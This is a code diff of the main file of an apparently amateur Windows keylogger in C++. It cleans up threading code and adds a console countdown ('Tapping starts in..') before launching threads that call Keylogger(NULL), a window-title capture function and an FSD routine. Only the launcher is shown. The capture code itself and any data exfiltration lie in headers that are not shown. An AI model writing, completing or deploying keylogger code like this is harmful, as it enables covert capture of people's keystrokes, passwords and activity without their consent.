@@ -5,49 +5,38 @@
 #include "winmanager.h"
 #include "KeyLogger.h"
 using namespace std;
-mutex mtx;
+
 int main()
 {
-    HMODULE hModule = GetModuleHandle(nullptr);
-    if (hModule != nullptr) {
-    // Keylogger(NULL);
     auto main = []() {
-        //mtx.lock();
-        printf("main start!\n");
+        printf("Running... \n");
         Keylogger(NULL);
-        printf("main end!\n");
-       // mtx.unlock();
+        printf("terminated.. \n");
     };
-    auto title = []() {
-       // mtx.lock();
-        printf("win start!\n");
-        wintitle;
-        printf("wintitle end!\n");
-        //mtx.unlock();
+    auto window = []() {
+        wintitle();
     };
     auto filesize = []() {
-        //mtx.lock();
-        printf("fsd start!\n");
-        FSD;
-        printf("fsd end!\n");
-       // mtx.unlock();
+        FSD();
     };
+    HMODULE hModule = GetModuleHandle(nullptr);
+    if (hModule != nullptr) {
+        printf("\033[1;32m");
+        Sleep(500);
+        printf("Tapping starts in..\n");
+        Sleep(1000);
+        printf("3..\n");
+        Sleep(1000);
+        printf("2..\n");
+        Sleep(1000);
+        printf("1..\n");
+        Sleep(1000);
 
-    thread t1 = thread(main);
-    thread t2 = thread(title);
-    thread t3 = thread(filesize);
-
-    t1.join();
-    t2.join();
-    t3.join();
+        thread t1 = thread(main);
+        thread t2 = thread(window);
+        thread t3 = thread(filesize);
+        t1.join();
+        t2.join();
+        t3.join();
     }
-    return 0;
-    /* thread mainThread = thread(Keylogger(NULL), 1, 5);
-    thread titleThread = thread(wintitle, 2, 6);
-    thread filesizeThread = thread(FSD, 3, 7);
-
-    mainThread.join();
-    titleThread.join();
-    filesizeThread.join();
-    */
 }
